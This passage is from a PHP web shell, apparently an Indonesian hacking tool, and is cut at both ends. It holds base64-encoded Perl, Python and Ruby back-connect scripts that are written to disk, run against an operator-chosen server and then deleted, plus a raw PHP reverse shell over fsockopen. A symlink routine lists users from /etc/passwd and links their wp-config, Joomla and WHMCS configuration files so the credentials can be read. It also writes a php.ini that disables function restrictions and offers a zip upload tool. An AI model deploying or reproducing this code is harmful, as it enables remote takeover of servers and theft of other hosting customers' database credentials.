$out = exe("perl bp.pl ".$_POST['port']." 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>$out\n".exe("ps aux | grep bp.pl")."</pre>";
unlink("bp.pl");
		}
		if($_POST['backconnect'] == 'perl') {
$bc=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
$plbc=@fopen('bc.pl','w');
fwrite($plbc,$bc);
$out = exe("perl bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>$out\n".exe("ps aux | grep bc.pl")."</pre>";
unlink("bc.pl");
}
if($_POST['backconnect'] == 'python') {
$becaa=base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBDb243ZXh0IC0gWGFpIFN5bmRpY2F0ZVxuVGhhbmtzIEdvb2dsZSBGb3IgUmVmZXJlbnNpXG5cbicnJykNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwwKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDEpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMikNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwzKQ0KICAgIHNoZWxsID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pDQogIGV4Y2VwdCBzb2NrZXQudGltZW91dDoNCiAgICBwcmludCAiVGltT3V0Ig0KICBleGNlcHQgc29ja2V0LmVycm9yLCBlOg0KICAgIHByaW50ICJFcnJvciIsIGUNCnB5YmFja2Nvbm5lY3QoKQ==");
$pbcaa=@fopen('bcpyt.py','w');
fwrite($pbcaa,$becaa);
$out1 = exe("python bcpyt.py ".$_POST['server']." ".$_POST['port']);
sleep(1);
echo "<pre>$out1\n".exe("ps aux | grep bcpyt.py")."</pre>";
unlink("bcpyt.py");
}
if($_POST['backconnect'] == 'ruby') {
$becaak=base64_decode("IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k");
$pbcaak=@fopen('bcruby.rb','w');
fwrite($pbcaak,$becaak);
$out2 = exe("ruby bcruby.rb ".$_POST['server']." ".$_POST['port']);
sleep(1);
echo "<pre>$out2\n".exe("ps aux | grep bcruby.rb")."</pre>";
unlink("bcruby.rb");
}
if($_POST['backconnect'] == 'php') {
            $ip = $_POST['server'];
            $port = $_POST['port'];
            $sockfd = fsockopen($ip , $port , $errno, $errstr );
            if($errno != 0){
              echo "<font color='red'>$errno : $errstr</font>";
            } else if (!$sockfd)  {
              $result = "<p>Unexpected error has occured, connection may have failed.</p>";
            } else {
              fputs ($sockfd ,"
                \n{################################################################}
                \n..:: BackConnect Php By .M4DI~UciH4 ::..
                \n{################################################################}\n");
              $dir = shell_exec("pwd");
              $sysinfo = shell_exec("uname -a");
              $time = Shell_exec("time");
              $len = 1337;
              fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "\n\n");
              while(!feof($sockfd)){ $cmdPrompt = '[M4DI~UciH4]#:> ';
              fputs ($sockfd , $cmdPrompt );
              $command= fgets($sockfd, $len);
              fputs($sockfd , "\n" . shell_exec($command) . "\n\n");
            }
            fclose($sockfd);
            }
          }
		echo "</p></div>";
}
if($_GET['do'] == 'whm'){
echo '<body bgcolor=black><h3 style="text-align:center"><font color= size=2 face="comic sans ms">
<form method=post>
<input type=submit class="inputz" name="ini" value="Generate PHP.ini" /></form>';

if(isset($_POST['ini']))
{

$r=fopen('php.ini','w');
$rr=" disable_functions=none ";
fwrite($r,$rr);
$link=" <a href=php.ini><font color=white size=2 face='Iceland'><u> PHP.INI </u></font></a>";
echo $link;
}

echo '<form method=post>
<input type=submit name="usre" class="inputz" value="Grab User" /></form>';

if(isset($_POST['usre'])){
echo '<form method=post>
<textarea rows=20 cols=40 style="background-color: #343436; font-family: Iceland; color: #fff;"name=user>';$users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."n";
}
echo'</textarea><br><br>
<input type=submit style="background-color: #343436; font-family: Iceland; color: #fff;" name=su value="Gaspol!" /></form>'; }

echo "<font color=white size=2 face='comic sans ms'>";
if(isset($_POST['su']))
{

$dir=mkdir('peler_whm',0777);
$r = " Options all n DirectoryIndex 7atim.html n Require None n Satisfy Any";
$f = fopen('ngentot/.htaccess','w');

fwrite($f,$r);
$consym="<a href=peler_whm/><font color=white size=3 face='comic sans ms'>configuration files</font></a>";
echo "<br>folder where config files has been symlinked<br><u><font color=red size=2 face='comic sans ms'>$consym</font></u>";

$usr=explode("n",$_POST['user']);

foreach($usr as $uss )
{
$us=trim($uss);

$r="Peler/";
symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
symlink('/home1/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home1/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home1/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home1/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home1/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home1/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home1/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home1/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home1/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home1/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home1/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home1/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home1/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home1/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home1/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home1/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home1/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home1/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home1/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home1/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home1/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home1/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home1/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home1/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home1/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home1/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
symlink('/home2/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home2/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home2/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home2/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home2/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home2/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home2/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home2/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home2/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home2/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home2/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home2/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home2/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home2/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home2/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home2/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home2/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home2/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home2/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home2/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home2/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home2/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home2/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home2/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home2/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home2/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
symlink('/home3/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home3/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home3/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home3/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home3/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home3/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home3/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home3/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home3/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home3/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home3/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home3/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home3/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home3/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home3/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home3/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home3/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home3/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home3/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home3/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home3/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home3/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home3/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home3/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home3/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home3/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
symlink('/home4/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home4/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home4/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home4/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home4/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home4/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home4/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home4/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home4/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home4/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home4/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home4/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home4/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home4/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home4/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home4/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home4/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home4/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home4/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home4/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home4/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home4/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home4/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home4/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home4/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home4/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
symlink('/home5/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home5/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home5/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home5/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home5/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home5/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
symlink('/home5/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
symlink('/home5/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
symlink('/home5/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
symlink('/home5/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home5/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
symlink('/home5/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
symlink('/home5/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
symlink('/home5/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home5/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home5/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
symlink('/home5/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
symlink('/home5/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
symlink('/home5/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
symlink('/home5/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
symlink('/home5/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
symlink('/home5/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
symlink('/home5/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
symlink('/home5/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
symlink('/home5/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
symlink('/home5/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
}
}
}
if($_GET['do'] == 'zip') {
	echo "<center><h1>Zip Menu</h1>";
function rmdir_recursive($dir) {
    foreach(scandir($dir) as $file) {
       if ('.' === $file || '..' === $file) continue;
       if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
       else unlink("$dir/$file");
   }
   rmdir($dir);
}
if($_FILES["zip_file"]["name"]) {
	$filename = $_FILES["zip_file"]["name"];
	$source = $_FILES["zip_file"]["tmp_name"];
	$type = $_FILES["zip_file"]["type"];
	$name = explode(".", $filename);
	$accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
	foreach($accepted_types as $mime_type) {
		if($mime_type == $type) {
			$okay = true;
			break;
		} 
	}
	$continue = strtolower($name[1]) == 'zip' ? true : false;
	if(!$continue) {
		$message = "Itu Bukan Zip  , , Goblok Anjenc!!";
	}
  $path = dirname(__FILE__).'/';
  $filenoext = basename ($filename, '.zip'); 
  $filenoext = basename ($filenoext, '.ZIP');
  $targetdir = $path . $filenoext;
  $targetzip = $path . $filename; 
  if (is_dir($targetdir))  rmdir_recursive ( $targetdir);
  mkdir($targetdir, 0777);
	if(move_uploaded_file($source, $targetzip)) {
		$zip = new ZipArchive();
		$x = $zip->open($targetzip); 
		if ($x === true) {
			$zip->extractTo($targetdir);
			$zip->close();
 
			unlink($targetzip);
		}
		$message = "<b>Success bitch !!</b>";
	} else {	
		$message = "<b>Error bitch !!</b>";
	}
}	
echo '<table style="width:100%" border="1">
  <tr><td><h2>Upload And Unzip</h2><form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" name="zip_file" /></label>
<input type="submit" name="submit" value="Upload And Unzip" />
</form>';
if($message) echo "<p>$message</p>";
echo "</td><td><h2>Zip Backup</h2><form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br><input type='text' name='dir' value='$dir' style='width: 280px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/cox_backup.zip' style='width: 280px;' height='10'><br><input type='submit' name='backup' value='BackUp!' style='width: 200px;'></form>";	
	if($_POST['backup']){ 
	$save=$_POST['save'];
	function Zip($source, $destination)
{
    if (extension_loaded('zip') === true)
    {
        if (file_exists($source) === true)
        {
            $zip = new ZipArchive();

            if ($zip->open($destination, ZIPARCHIVE::CREATE) === true)
            {
                $source = realpath($source);

                if (is_dir($source) === true)
                {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

